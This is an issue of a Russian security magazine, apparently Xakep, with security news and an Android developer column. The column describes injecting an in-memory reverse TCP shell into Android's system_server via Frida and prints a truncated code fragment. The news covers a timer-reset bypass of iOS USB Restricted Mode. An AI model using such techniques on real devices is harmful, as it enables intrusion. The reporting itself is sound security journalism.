   из сообщений, однако из‐за бага в коде они провоцировали сбои.





  →«Правда ли Apple добави ла в iOS код, чтобы угодить китайским властям? Конеч но! А когда
   код оказался забагованным, страдать из‐за этого пришлось пользовате лям»
  — Патрик Ворлд





 В IOS ЗАРАБОТАЛ
 USB RESTRICTED
 MODE
  Компания Apple представила iOS 11.4.1, в сос таве которой появился защит‐
  ный механизм USB Restricted Mode. Данную функцию уже можно было наб‐
  людать в бета‐версиях iOS, начиная с 11.3. В сущности, USB Restricted Mode
  принуждает пользователей мобильных устрой ств вводить пароль при подклю‐
  чении гаджета к ПК, Mac и USB‐устройствам, если перед этим девайс
  находился в заблокированном состоянии более часа.
     Таким образом, если не разблокировать телефон в течение часа, включит‐
  ся защитный механизм. В теории это призвано помешать спецслужбам и пра‐
  воохраните лям взламывать устройства Apple, прибегая для этого к помощи
   таких компаний, как Cellebrite и Grayshift. Так, после акти вации USB Restricted
  Mode полностью отключается любой обмен данными через встроенный
   в устройство порт Lightning. Единственное, что оста ется дос тупным, — заряд‐
   ка; с точки зре ния компьютера, к которому будет подключен iPhone с акти‐
  вировавшимся режимом USB Restricted Mode, устрой ство ничем не будет
  отличаться, к примеру, от внешнего акку мулятора.
     Хотя официального релиза новой защитной функциональности ожидали
  не раньше выхода iOS 12, как уже было ска зано выше, USB Restricted Mode
  вышел из беты и представлен в iOS 11.4.1. Спе циалист Elcomsoft и автор жур‐
  нала «Хакер» Олег Афонин уже посвятил новой функциональности отдельную
  публикацию в блоге компании.
     Ранее экспер ты Elcomsoft уже исследова ли бета‐версии USB Restricted
  Mode и признали, что он дос таточно надежен: телефон дей ствительно отка‐
  зывался «общаться» с компь ютером, даже если его перезагрузить. Если
  перевести iPhone в режим Recovery или DFU, он становится доступен
  с компьютера, но перебор паролей в этих режимах все равно был невоз‐
  можен. Иссле дователи даже пытались «вос становить» устройство, залив
  на него свежую прошивку, — но даже это не помогло отключить USB Restrict‐
  ed Mode.
     Все это по‐прежнему актуально и для iOS 11.4.1, однако Афонин пишет, что
  обмануть USB Restricted Mode все же возможно. Как оказалось, таймер
  обратного отсчета до активации USB Restrictive Mode обнулится, если успеть
  подклю чить к iPhone любой недоверенный USB‐аксессуар.



         «Как только офицер полиции изы мет iPhone  [у прес тупника], ему
        или ей сроч но потребу ется под клю чить к этому iPhone любой сов-
        местимый USB-аксессу ар, чтобы пре дотвра тить активацию режима
       USB Restricted Mode, которая произойдет через час. Важно заметить,
         что это поможет лишь в том слу чае, если USB Restricted Mode был
         неак тивен на этом iPhone», — пишет Олег Афонин.

  Для сброса таймера подойдет практически любой USB‐аксессуар, включая
  официальный Lightning to USB 3 Camera Adapter. Впрочем, уже обнаружилось,
   что Apple Lightning to 3.5mm jack adapter для этих целей не подходит, и иссле‐
  дователи продолжают тес тировать другие аксессу ары, в том числе и неори‐
   гинальные, заказанные с AliExpress. По сло вам Олега Афонина, скорее всего,
  большинство из них справит ся с задачей обнуления таймера.
     Теперь ИБ‐специалис тов очень интересу ет, почему USB Restricted Mode
   так легко обмануть и испра вит ли Apple этот недочет в сос таве iOS
   11.4.2 и iOS 12. Странно и то, что данный «баг» успешно пережил пять
  бета‐версий.
     Эксперты Elcomsoft полага ют, что проблема может заключаться в самом
  протоколе Lightning. Дело в том, что, когда iPhone соединяется с компьюте‐
  ром, устройства обменива ются крип тографическими ключами, прежде чем
  начнут доверять друг дру гу. Но при подключении к большинству существу‐
  ющих Lightning‐аксессуаров ничего подоб ного не происходит, ведь многие
  из них попросту не могут совершить такой обмен ключами, как это делает
  компьютер. В результате, пока USB Restricted Mode неактивен, iPhone про‐
  веряет для аксессуаров только сертификаты MFi, и на этом проверки закан‐
  чиваются.
     Олег Афонин отмечает, что изменить этот процесс Apple вряд ли сумеет,
   учитывая, что множество MFi‐устройств спроекти рованы совершенно иным
  образом. Единственный воз можный вариант решения проблемы, предложен‐
  ный аналитиками  Elcomsoft, — «научить» iPhone запоминать, с какими
   аксессуарами он соединялся ранее, и доверять сброс таймера только им.


 МОЩНОСТЬ DDOS‐АТАК УМЕНЬШИЛАСЬ
   Исследователи «Лаборатории Каспер ского» представили отчет, пос вящен ный DDoS‐атакам
   во втором квартале 2018 года. По дан ным ком пании, средняя и максимальная мощность атак
   изрядно упали по сравнению со второй половиной 2017 года. Однако если сравнивать показа‐
   тели первого полугодия 2018 года с первым полугодием 2017 года, все же можно обнаружить
   значительный рост мощности атак.





   Лидирующее положение по чис лу атак сохраняет Китай (59,03%), на вто ром месте оказал ся
   Гонконг (17,13%). Он же вошел в тройку лидеров (12,88%) по количес тву уникальных мишеней,
   уступив Китаю (52,36%) и США (17,75%).





   До 80,2% увеличилась доля SYN‐атак. Второе место пос ле них заняли UDP‐атаки с долей
   10,6%. Также аналитики столкнулись с атакой, усиленной через CHARGEN, чья мощность сос‐
   тавила несколько десятков гигабит в секунду.

   Значительно выросла доля атак с Linux‐ботнетов — 94,47% всех односемейственных атак.

   Самая долгая атака во втором квар тале продолжалась 258 часов (почти 11 дней), что немногим
   уступает рекорду прошлого квар тала — 297 часов (12,4 дня). В этот раз настойчивее всего
   хакеры мешали работе одного из IP‐адресов китайского про вайдера China Telecom.


   Теперь же организаторы DDoS‐атак обратили внимание на индус трию онлайн‐игр и стримеров.
   Атаки на отдельных игроков и специальные площадки для проведения турниров (с целью оста‐
   вить спортсменов без доступа к игровому сер веру) получили в пос леднее время активное рас‐
   пространение.


   Также популярность набрали DDoS‐атаки для срыва игровых стримов, так как конкуренция
   в этом сегменте очень высока, а с помощью DDoS‐атак злоумыш ленники могут мешать про‐
   ведению онлайн‐трансляций конкурен тов.





                                        Продолжение статьи →
← Начало статьи





 3D‐ОРУЖИЕ
 В МАССЫ
  Еще в 2013 году организа ция Defense Distributed, продвигающая идеи опен‐
  сорсного оружия и занимающаяся его раз работкой, представила миру пис‐
   толет «Освободитель» (Liberator), все детали которого можно распечатать
  на 3D‐принтере.
     Для  изготов ления  «Освободителя»  тогда  использовался  промыш‐
  ленный 3D‐принтер Stratasys Dimension SST, печатающий детали из прочного
  термопластика ABS. Пять лет назад приобрести такой б/у принтер на аук‐
  ционе eBay можно было за 8000 долларов. Тог да «Освободитель» был
  несовершенен: производил лишь нес колько выстрелов, после чего разработ‐
   чики предлагали менять ствол.
    Однако сама идея печатного оружия наделала много шума. Все необ‐
  ходимые для изготовления пистолета файлы были опубликованы на офи‐
  циальном сайте организации (Defcad.org). Но совсем скоро разработчиков
  вынудили убрать макеты из открытого доступа. Defense Distributed получила
  соответствующее предписание от Государственного департамента США.
     Хотя организация стремилась соответс твовать всем нормам, регули‐
  рующим оборот огнестрельного ору жия, раз работчиков уведомили, что опуб‐
  ликованные ими файлы не соответствуют пра вилам международной торговли
  оружием (International Traﬃc in Arms Regulations). Стоит сказать, что самос‐
   тоятельное изго товление оружия противо речит не только законам некоторых
  штатов, но и законам дру гих стран. При этом представителей Госдепар‐
  тамента, похоже, не тревожило, что файлы уже были скачаны сотни тысяч раз
  и распространились по интернету.
    Опасаясь уго ловной ответс твенности, Defense Distributed убрали файлы
  с сайта и обратились в Госдепартамент с офи циальным запросом, наде ясь,
   что это прояснит ситуацию и поможет най ти способ легальной публикации
  файлов. Разработчики ждали два года, однако так и не получили отве та. Тогда
  представители Defense Distributed объеди нились с активистами из Second
  Amendment Foundation и подали на Государс твенный департамент судебный
   иск.
    В середине июля 2018 года стало известно, что Defense  Distributed
  наконец удалось урегулировать все вопросы с Госдепом и организации раз‐
  решили опубликовать макеты для печати оружия на офи циальном сайте. Ожи‐
  дается, что файлы будут выложены в начале августа. Кстати, Государственный
  департамент даже согласился покрыть юридические издержки разработ‐
  чиков и в итоге выплатит им 40 тысяч долларов.
    Основатель Defense Distributed Коди Уилсон (Cody Wilson) сообщил, что
  выиграть судебное разбирательство, конечно, было приятно, однако пуб‐
  ликация файлов на Defcad.org уже вряд ли что‐то сильно изменит. Дело в том,
   что все эти годы файлы «Освободителя» отлично распространялись через
  торрент‐трекеры и другие подобные ресурсы.


  100 000 ДОЛЛАРОВ ЗА ВЗЛОМ КОШЕЛЬКА BITFI

   Джон Макафи анонсировал у себя в Twitter, что готов выплатить вознаграждение в размере
   100 000 долларов США любому, кто сумеет взломать криптовалютный кошелек Bitﬁ, соз‐
   данный одноименной компанией совместно с самим Макафи. В своем сообщении он в очеред‐
   ной раз называет Bitﬁ «невзламываемым» и призывает скептиков убе диться в этом лично.


   Впрочем, скептики пишут, что размер предложенной наг рады подозрительно скро мен для «нев‐
   зламываемого» решения (за которое к тому же придется отдать 120 долларов), и подоз ревают,
   что Макафи просто пытается провести аудит своего продукта за счет сообщества.





 РУССКИЕ ХАКЕРЫ
 ВСЮДУ
  Накануне встречи Владимира Путина и Дональда Трампа, которая прошла
   в рамках саммита в Хельсинки, предста вители Министерства юстиции США
  выступили с громким обвинением.
     Согласно официальному заявлению Минюста, двенадцать офицеров ГРУ
  были причастны к кибера такам на президентские выборы в 2016 году: Виктор
  Нетыкшо, Борис Антонов, Дмитрий Бадин, Иван Ермаков, Алексей Лукашев,
  Сергей Моргачев, Николай Козачек, Павел Ершов, Артем Малышев, Алек‐
  сандр Осадчук, Алексей Потемкин и Анатолий Ковалев.
    Американская сторона утвержда ет, что в 2016 году вышеназ ванные «пра‐
   вительственные хакеры» взло мали Наци ональный комитет Демократической
  партии США, Комитет по выборам в конгресс Демократичес кой партии США,
  а также отдельных членов предвыборного шта ба Хилари Клинтон. Похищен‐
  ные таким образом сведения якобы были опубликованы в интерне те от лица
  DCLeaks и Guccifer 2.0.
    В обвинительном заключении сказано, что все обвиняемые слу жили в час‐
   тях 21165 и 74455 (Unit 26165 и Unit 74455) и в 2016 году провели серию
  фишинговых атак, направленных на волонтеров и членов предвыборного шта‐
  ба Хилари Клинтон, включая его главу. В резуль тате им удалось завладеть
   учетными данными от самых разных сервисов, похитить электронные письма
  жертв и, используя полученные данные, продолжить вторгаться на другие
  компьютеры.
     Кроме того, хакеры якобы проникли в сети Национального комите та
  Демократической партии США, а также Комитета по выборам в конгресс
  Демократической партии США, откуда также были похищены электронные
  письма и документация. Пос ле себя взломщики оста вили в сетях множество
  вредоносных «закладок», включая спай варь X‐Agent и X‐Tunnel, способную
  записывать нажатия клавиш, похищать файлы и делать снимки рабочего сто‐
   ла, передавая все соб ранные данные атакующим. Это позволило им и далее
  следить за происходящим, наблюдать за сотрудни ками комитетов и продол‐
  жать похищать данные. Утверждается, что в общей сложности от атак пос тра‐
  дало более 300 человек.
    Похищенная таким образом информа ция была опубликована на сайте
  DCLeaks.com, а также переда на некой неназ ванной третьей стороне (веро‐
  ятнее всего, речь идет о WikiLeaks). Кроме того, правительственные хакеры
   якобы выдавали себя за хактивис та‐оди ночку, скрывающегося под псев‐
  донимом Guccifer 2.0.
    Напомню, что имен но он взял на себя ответс твенность за взлом Демок‐
  ратической партии США. Позже, когда ИБ‐эксперты обнаружили в этих атаках
  «российский след» и связь с группами APT28 (также известна как Fancy Bear,
   Sofacy, Sednit, Pawn Storm или Strontium) и Cozy Bear (они же СozyDuke
  или APT29), Guccifer 2.0 дал интервью журналистам Vice Motherboard, заявив,
   что не имеет каких‐либо свя зей с Рос сией и вооб ще живет в Румынии.
     Кроме того, Минюст сооб щает, что служащие части 74455 взламывали
  компьютеры избирательной комиссии и секретари ата неназванного штата,
  а также фирм, которые пос тавляли ПО и дру гие технологии для проведе ния
  выборов. Все это делалось с целью хищения информации о сотнях тысяч
  избирателей. При этом хакеры тща тельно скрывали свои личности, а для
  финансирования своих операций (покуп ки серверов, доменов и доступа
   к аккаунтам) использовали криптовалюты и майнили Bitcoin, что помогало им
  скрыть происхождение средств.


 РОССИЯНЕ НЕ БОЯТСЯ СКРЫТЫХ МАЙНЕРОВ

   Более 40% россиян не задумываются о том, что их гаджеты могут быть заражены скрытыми
   майнерами, следует из проведенного Avast опроса 2000 респондентов. Почти треть из них
     (32%) полагают, что в принципе не могут стать жертвами вредоносной майнинговой малвари,
   так как не владеют майнинг‐фермами и не занимаются добычей крип товалюты.

   При этом 95% опрошенных знакомы с криптовалютами, а 82% слышали о вредонос ных
   или зараженных сайтах, которые майнят крип товалюту за счет посетителей.

   Более того, 20% пользователей заявили, что выбрали бы крип томай нинг как альтернативу
   назойливой рекламе.





 ВЗЛОМАЛ DENUVO?
ЖДИ ПОЛИЦИЮ
  Совсем недавно мы писали о крякере Voksi (21‐летний житель Бол гарии),
  который сумел справиться с новейшими версиями защиты Denuvo, взломав
   Total War Saga: Thrones of Britannia, Tekken 7, Injustice 2 и новое DLC для Prey.
    Напомню, что Voksi, основавший группу Revolt, стал своего рода народ ным
  героем в крякер ском сообщес тве. Дело в том, что он научился всему сам,
  с нуля, даже не имея про филь ного образования. Он час тенько захаживал
  на различные крякерские форумы и обсуждал с пользователями последние
  разработки в области DRM‐защиты и способы их обхода, выкладывал
  на YouTube подробные обучающие видео о взломах, а защиту Denuvo называл
  не иначе как «рак игровой индустрии».
    Но в конце июля пользователи обра тили внимание, что происходит нечто
  странное. Voksi, который обычно демонс трировал постоянную активность
   в онлайне (это даже ста ло поводом для шуток, мол, крякер никогда не спит
  и не отдыхает, следовательно, он не человек, а робот) пропал из сети и ни
  с кем не общался.
     Хуже того, вслед за самим Voksi из интернета исчез «дом» группы Revolt —
  ее сайт и форум. А затем для сайта Revolt.group вдруг заработала переадре‐
  сация на mvr.bg: посетители ресурса попадали на официальный сайт МВД
  Болгарии. Хотя многие пользователи решили, что это шутка, отсутствие Voksi
  и молчание с его стороны наводили на совсем дру гие, куда более мрачные
  мысли.
     26 июля 2018 года Voksi вернулся в онлайн и вышел на связь с журналис‐
  тами издания TorrentFreak, объяснив, что происходит. Увы, наиболее мрачные
  прогнозы оказались верны: компания Irdeto, которой с недавних пор принад‐
  лежит Denuvo, обратилась к правоохранительным органам с заявлением
  о возбуждении уголовного дела, и крякером заинтересовалась бол гарская
  полиция.
      Voksi рассказал журналистам, что к нему домой пришли сотрудники пра‐
  воохранительных органов, в том числе сот рудники отде ла по борьбе с орга‐
  низованной  преступностью  и местные  полицейские.  Их  интересовала
  деятельность Voksi, связанная со взло мом Denuvo. Как именно полиция наш‐
  ла крякера, пока остается неяс ным, но сам Voksi говорит, что вычис лить его
  было вполне возможно.
     Представите ли органов пра вопорядка провели в доме Voksi обыск и изъ‐
  яли его основной рабочий компь ютер и сервер. Самого кря кера, как ни
  странно, не задержали на мес те, но пригласили в полицейский учас ток
  для дачи показаний на следующий день. И даже пос ле этого Voksi пока оста‐
  вили на свободе.
      Voksi не сообщил, какие именно обвинения ему предъ являют, однако рас‐
   сказал, что полиция говорила об ущербе, который его деятельность наносит
  Denuvo (впрочем, не ссылаясь на какие‐либо конкретные законы).
     Крякер рассказал, что уже попытался связаться с представителями Denu‐
   vo и урегулировать возникший конфликт мир ным путем. Он не стал вдаваться
   в подробности и описывать эту беседу детально, но заявил, что у него сло‐
  жилось впечатление, будто представители Denuvo уже приняли окончатель‐
  ное решение (которое им к тому же могли навязать «сверху»). Теперь в ком‐
  пании считают, что дальнейшую судьбу Voksi должна решать болгарская про‐
   куратура.
     Разумеется,  в  сложившейся  ситуации  Voksi не сможет продол жать
  заниматься крякингом, и группе Revolt тоже пришел конец (власти действи‐
   тельно изъяли домен официального ресурса груп пы).



         «К сожале нию, я более не смогу заниматься тем, чем занимался. Я
        делал это ради вас, ребята, и, конеч но, из‑за того, что такое раз дутое
       ПО [как Denuvo] вообще не должно присутс твовать в играх. Воз можно,
         кто‑то дру гой сможет продолжить мой бой», — пишет Voksi на Reddit.

  В настоящее время кря кер ищет помощи юристов, так как адвоката ему
  не предоставили ни во время проведения обыска, ни во вре мя допроса. Всех
  неравнодушных и желающих помочь он просит обра щаться в Discord‐канал
   группы Revolt или к нему лично (Voksi#3486).


  1000+ КРИПТОВАЛЮТ НЫХ ПРОЕКТОВ ПРИЗ НАНЫ «МЕР‐
 ТВЫМИ»

   Аналитики Coinopsy и DeadCoins подсчитали, что на конец июня 2018 года в мире нас читыва‐
   лось более 1000 «мертвых» крип товалютных проектов, прекративших или вообще не начинав‐
   ших работу. Среди этих «почивших» проектов мно го откро вен но скамерских решений, деятель‐
   ность которых уже расследует комиссия по цен ным бумагам и биржам США, к примеру: BRIG,
    Titanium, OreoCoin и Droplex.


   Исследователи подчеркивают, что в общей сложности закрывшиеся проекты привлекли мил‐
   лиарды долларов инвести ций. Так, по данным специалис тов Satis Group, только в 2017 году
   мошеннические ICO собрали более 1 000 000 000 дол ларов.

   Фактически только 8% токенов пос ле ICO попадают на биржи с хорошей репутацией и дей‐
   ствительно продолжают существовать.

 ДРУГИЕ ИНТЕРЕСНЫЕ
 СОБЫТИЯ МЕСЯЦА
   • Похищенный у АНБ экспло ит DoublePulsar адап тировали для работы с Win‐
     dows Embedded
   • Исходные коды банковского трояна Exobot для Android опубликованы
     в открытом доступе
   • Кардеры отмывали деньги в мобильных играх Clash of Clans, Clash Royale
     и Marvel Contest of Champions. Разоб лачить их помогла незащищенная
     база MongoBD, содержавшая подробнос ти операций
   • Уязвимость позволяла обойти аутентифика цию в продуктах Hewlett Packard
      Integrated Lights‐Out 4 (HP iLO 4) при помощи 29 букв A
   • Разработчики Google представили аппа рат ные USB‐ключи Titan Security
     Key для безопасной двухфакторной аутентификации
   • В американском Айда хо заключенные сумели скомпромети ровать спе‐
     циальные планшеты, которыми разрешено поль зоваться в тюрьмах, и кре‐
     дитовали самих себя на 225 000 долларов
   • Миллионы устрой ств, поддерживающие Bluetooth, оказались в опасности
     из‐за криптографической уяз вимос ти
   • Хакеры похитили у российского ПИР Банка 58 миллионов рублей, ском‐
     прометировав один‐единственный роутер
   • Сканер GitHub научился автоматичес ки следить за безопасностью про‐
     ектов на Python
   • Читеры в Fortnite были атакованы мал варью, вмешивающейся в трафик
    HTTPS
HEADER
ANDROID

      ОБЗОР ANDROID GO, НОВЫЕ
    МЕХАНИЗМЫ ЗАЩИТЫ ANDROID P
        И ОБРАТНЫЙ ШЕЛЛ
        С ПОМОЩЬЮ FRIDA





                                         Евгений Зобнин
                                           Редактор Unixoid и Mobile
                                                     zobnin@glc.ru





Сегодня  в  выпуске:  отличия  облегчен ного  Android Go
от стандартного Android, новые механизмы защиты Android P,
инструкция по внедрению обратно го TCP‐шелла в Android
с помощью Frida, распознавание лиц и текста с помощью ML
Kit, генерация кода Kotlin с помощью аннотаций и описание
новейшего  MotionLayout.  А  так же:  подборка  ссылок
на ресурсы, облегчающие дизайн UI, и 14 свежих библиотек.



ИНСТРУМЕНТЫ И РЕСУРСЫ


 • XDebug — не новый, но весьма полезный модуль Xposed, который поз‐
   воляет отлаживать любое установленное на смартфон приложение;
 • exploit_playground — подборка эксплоитов с комментариями.



ПОЧИТАТЬ


Чем отличается Android Go от обыч ного Android
Android Go — How does Google’s  lightweight ecosystem compare  to the
original? — статья с описанием отличий облегченной версии Android от пол‐
ноценной. Основные тезисы:
 • В отличие от устрой ств Android One, которые поставляются на рынок
   с  «чистым  Android», смартфоны  на  Android Go  будут продаваться
   с модификациями и приложениями производителя смартфона (если он
   этого пожелает).
 • Единственное заметное пользователю отличие Android Go от обычного
   Android — дизайн окна запущенных приложений.
 • В Android Go отключены некото рые ненуж ные большинс тву пользователей
  функции: Daydream VR, функция раз деления экрана, поддержка Android
   Auto и Android Wear, Android for Work.
 • По умолчанию в Android Go отключено шифрование, однако некоторые
   устройства позволят его включить.
 • Android Go гораздо более агрессивен в уничтожении фоновых приложе ний
   (он старается убрать из памяти все, что не свя зано с самой операционной
   системой).
 • В Android Go по умолчанию включен zRAM, сжимающий данные в опе‐
   ративной памяти для ее эко номии.
 • Некоторые предустановленные при ложения Android Go — это веб‐при‐
   ложения; например, Gmail Go и Google Maps Go — это WebView, в котором
   открывается написанный на HTML5/JS интерфейс, причем Google Maps
  Go весит 1 Мбайт, а Gmail Go больше стандартно го приложе ния Gmail.
 • Часть приложений из комплекта Android Go сильно уре заны: YouTube Go
   не поддерживает комментарии и не поз воляет ставить лайки, Assistant Go
   не имеет каких‐либо опций, другие, наоборот, пре доставляют полный
   набор функций: Google Maps Go почти в точности повторя ет оригинальное
   приложение.





                       Gmail Go и Google Maps Go


Но вые защитные фун кции Android P
Compiler‐based security mitigations in Android P — пост разработчиков Android
с рассказом о том, какие функции компилятора LLVM/Clang они применили
в Android P для защиты от раз ного вида атак.
   1. Control Flow Integrity. В современных экс плоитах важным шагом
часто бывает модификация указателей на функцию и адресов возврата. Она
позволяет обойти ограничение на исполнение стека и сегмента данных
с помощью пере использования кусков самого приложения.
   Технология Control Flow Integrity (CFI) предназна чена для борьбы с такими
эксплоитами. При ее включении компилятор стро ит граф вызовов функций
и встраивает код сверки с этим графом перед каждым вызовом функции.
Если вызов происходит по откло няющемуся от гра фа адресу, приложение
завершается.
   Разработчики Android уже включили CFI для нес кольких системных ком‐
понентов в Android 8. В Android P покрытие расширилось и теперь включает
в себя медиафреймворки, а также стек NFC и Bluetooth. Тес товая поддержка
также реализована для ядра.
   2. Integer Overflow Sanitization. Данная технология предназначена
для защиты  от целочисленного перепол нения. Компилятор  встраивает
в результирующий код приложений функции проверки, которые используются
для подтверждения, что исполняемая арифметичес кая операция не вызовет
переполнения.
  Впервые технология была использована в Android 7 для защиты медиасте‐
ка, в котором обнаружи ли целый комплекс удаленных уязвимостей Stagefright.
В Android P она также используется для защиты следующих компонентов: libui,
libnl, libmediaplayerservice, libexif, libdrmclearkeyplugin и libreverbwrapper.





          Код вызова функции с отклю ченным и включенным CFI


Об ратный TCP-шелл с помощью Frida
Shellcoding an Arm64 In‐Memory Reverse TCP Shell with Frida — статья с рас‐
сказом, как внедрить в Android обратный TCP‐шелл с помощью Frida.
   Это возможно благодаря классу Arm64Writer, который появился во Frida
10.4. Он позволяет записывать инструкции ARM64 прямо в память, а затем
исполнять их. Чтобы соз дать обратный шелл, автор статьи написал его
на языке ассемблера, а затем с помощью Arm64Write поместил в память про‐
цесса system_server (в Android это один из центральных компонентов опе‐
рационной системы).
   Часть кода обратного шелла:


var impl = Memory.alloc(Process.pageSize);
Memory.patchCode(impl, Process.pageSize, function (code) {
    var arm64Writer = new Arm64Writer(code, { pc: impl });
    // SUB             SP, SP, #0x50
    arm64Writer.putSubRegRegImm('sp', 'sp', 0x50);
    // STP             X29, X30, [SP, #0x40]
    arm64Writer.putStpRegRegRegOffset('x29', 'x30', 'sp', 0x40, 'pre‐
adjust');
    // ADD             X29, SP, #0x40
    arm64Writer.putAddRegRegImm('x29', 'sp', 0x40);
    ...
    arm64Writer.putRet();
    armWriter.flush();
});



РАЗРАБОТЧИКУ


Ге нерация кода Kotlin с помощью анно таций
Generating Code via Annotations in Kotlin — статья об использовании процес‐
сора аннотаций kapt и генератора кода  KotlinPoet для генерации кода
из аннотаций на примере биндинга View. Алгоритм соз дания процес сора
достаточно несложный и состоит из четырех основных шагов:
 1. Объявляем аннотацию:


   @Retention(AnnotationRetention.SOURCE)
   @Target(AnnotationTarget.FUNCTION)
   annotation class BindField( val viewIds : Array<String>, val
   viewName : String)

 2. Создаем класс — процессор аннотации:


   @AutoService(Processor::class) // For registering the service
   @SupportedSourceVersion(SourceVersion.RELEASE_8) // to support
   Java 8
   @SupportedOptions(BindFieldsProcessor.KAPT_KOTLIN_GENERATED_OP
   TION_NAME)
   class BindFieldsProcessor: AbstractProcessor()

 3. Внутри функции process клас са‐процесса создаем цикл, который проходит
   по всем элементам, объявленным с помощью нашей аннотации, и, когда
   необходимо, возвращает ошиб ки при неп равильном использовании анно‐
   тации (в данном случае при использовании в отношении нефункции):


   roundEnv.getElementsAnnotatedWith(BindField::class.java).forEach {
    methodElement ‐>
       if (methodElement.kind != ElementKind.METHOD) {
           processingEnv.messager.errormessage {
               "Can only be applied to functions,  element: $method
   Element "
           }
           return false
       }
       ...
   }

 4. Генерируем код с помощью KotlinPoet:


   val funcBuilder = FunSpec.builder("bindFields")
         .addModifiers(KModifier.PUBLIC)
         .addParameter(variable.simpleName.toString(), variab
   leAsElement.asType().asTypeName())
         .addParameter(method.getAnnotation(BindField::class.java).
   viewName, ClassName("android.view", "View"))
   annotationArgs.forEachIndexed { index, viewId ‐>
     funcBuilder.addStatement(
             "%L.findViewById<%T>(R.id.%L).text = %L.%L",
             method.getAnnotation(BindField::class.java).viewName,
             ClassName("android.widget", "TextView"),
             viewId,
             variable.simpleName,
             fieldsInArgument[index].simpleName
     )
   }


Распознавание лиц с помощью нейрон ной сети
Building a real‐time face detector in Android with ML Kit — статья о создании
приложения с функцией распознавания лиц в режиме реального времени
с помощью Firebase ML Kit (комплекс алгорит мов рас познавания объ ектов
на базе нейронных сетей).
  Задача: сделать систему, которая будет выделять лица в видоискателе
камеры в режиме реального времени. Делается это в четыре шага:
 1. Подклю чаем библиотеку Firebase к своему про екту.
 2. Создаем простейший View, который рисует прямоугольники в заданных
  местах.
 3. Создаем CameraView с наложенным поверх него нашим кастомным View.
 4. Подклю чаем к CameraView про цес сор фреймов, который передает фрей‐
  мы в ML Kit, а затем обновляет на основе полученной информации кас‐
   томный View (который рису ет пря моугольники вокруг лиц).

Ключевая часть приложения:


class FaceDetector(private val faceBoundsOverlay: FaceBoundsOverlay)
{
    private fun detectFacesIn(frame: Frame) {
        firebaseFaceDetectorWrapper.process(
                image = convertFrameToImage(frame),
                onSuccess = {
                    faceBoundsOverlay.updateFaces( /* Faces */)
                },
                onError = { /* Display error message */ })
    }
    ...
}


Распознавание тек ста с помощью нейрон ной сети
Text Recognition with ML Kit — еще одна статья об использовании Firebase ML
Kit. В отличие от предыдущей статья подробно рас сказывает о том, что такое
ML Kit, как добавить свой проект в Firebase и подклю чить библиотеку к про‐
екту.
  В качестве примера автор статьи создает приложение для рас познавания
аккаунтов Twitter, написанных на бумаге. При этом сам процесс рас позна‐
вания выполняется либо на устройстве, либо в облаке. Первый способ
не требует доступа в интернет, зато второй более точный и не создает наг‐
рузку на процессор устройства.
   Распознавание текста на устройстве про исходит так.
 1. Подготавливаем изоб ражение и детектор:


   val image = FirebaseVisionImage.fromBitmap(selectedImage)
   val detector = FirebaseVision.getInstance().visionTextDetector

 2. Запускаем процесс рас позна вания, указав колбэк, который будет выпол‐
   нен после его завершения:


   detector.detectInImage(image)
       .addOnSuccessListener { texts ‐>
           processTextRecognitionResult(texts)
       }
       .addOnFailureListener { e ‐>
           e.printStackTrace()
       }

 3. В качестве аргумента колбэк получит объект типа FirebaseVisionText, он
   будет содержать массив обнаруженных блоков текста, а сами блоки будут
   содержать элементы со строками, с которы ми можно работать (например,
   подсветить):


   private fun processTextRecognitionResult(texts: FirebaseVisionText
   ) {
       view.hideProgress()
           val blocks = texts.blocks
           if (blocks.size == 0) {
               view.showNoTextMessage()
                   return
           }
       blocks.forEach { block ‐>
           block.lines.forEach { line ‐>
               line.elements.forEach { element ‐>
                   if (looksLikeHandle(element.text)) {
                       view.showHandle(element.text, element.boundi
   ngBox)
                   }
               }
           }
       }
   }

Распознавание текста в облаке выпол няется похожим образом, но имеет
несколько отличий. Например, облачная нейронная сеть уме ет рас познавать
параграфы и давать информа цию об отдельных символах, и это надо учи‐
тывать во время прохода по полученным блокам текста.


Соз дание анимаций с помощью MotionLayout
Creating Animations With MotionLayout for Android — статья о MotionLayout, рас‐
ширении ConstraintLayout, позволяющем описывать анимации декларативно
прямо в XML‐файле.
   MotionLayout основан на идее сцен движения (motion scene), которые опи‐
сывают начальное, конечное и промежуточные состояния графичес кого эле‐
мента во время анимации, а также способ переключения между этими сос‐
тояниями.
  Например, сле дующая сцена описывает ани мацию перемещения элемен‐
та actor из правого нижнего угла экрана в левый верхний:


<?xml version="1.0" encoding="utf‐8"?>
<MotionScene
    xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res‐auto">
    <ConstraintSet android:id="@+id/starting_set">
        <Constraint android:id="@+id/actor"
            app:layout_constraintBottom_toBottomOf="parent"
            app:layout_constraintRight_toRightOf="parent"
            android:layout_width="60dp"
            android:layout_height="60dp"
            />
    </ConstraintSet>
    <ConstraintSet android:id="@+id/ending_set">
        <Constraint android:id="@+id/actor"
            app:layout_constraintTop_toTopOf="parent"
            app:layout_constraintLeft_toLeftOf="parent"
            android:layout_width="60dp"
            android:layout_height="60dp"
            />
    </ConstraintSet>
    <Transition
        android:id="@+id/my_transition"
        app:constraintSetStart="@+id/starting_set"
        app:constraintSetEnd="@+id/ending_set"
        app:duration="2000">
</MotionScene>

Запустить анимацию можно примерно так:


motion_container.transitionToEnd()

Инстру мен ты дизайна для инди‑раз работчика
Solo Android Developer? Here are all the design tools you’ll ever need — список
ресурсов, которые пригодятся в создании дизайна приложения.
   Иконки:
 • Font Awesome;
 • Android Asset Studio;
 • icons8.com;
 • ﬂaticon.com;
 • thenounproject.com.

Инструменты подбора цветов:
 • materialui.co;
 • materialuicolors.co;
 • material.io.

Примеры дизайна и готовые макеты:
 • uplabs.com;
 • pttrns.com.


Инстру мен ты
 • androme — утилита для конвертирова ния HTML‐страниц в набор XML‐лай‐
   отов Android;
 • SDK Search — приложение для Android и пла гин для Google Chrome
   для поиска по документации Android SDK;
 • deep‐clean — скрипт для очистки всех кешей сборки Gradle.


Биб лиоте ки
 • kotlin‐extensions — нес коль ко полез ных функций‐расширений Kotlin;
 • ColorPickerView — очередной диалог выбора цветов;
 • android‐material‐color‐picker‐dialog — и еще один диалог выбора цветов,
   в этот раз в стиле Material с ползунка ми;
 • Indicator Fast Scroll — фаст‐скроллер, показывающий алфавитный ука‐
   затель и пузырь с буквой;
 • Easy NLU — библиотека семантического парсинга  строк, подходит
   для создания приложений‐ассистентов;
 • QuickPermissions‐Kotlin — простая и удоб ная в использовании Kotlin‐биб‐
   лиотека для runtime‐проверки полномочий;
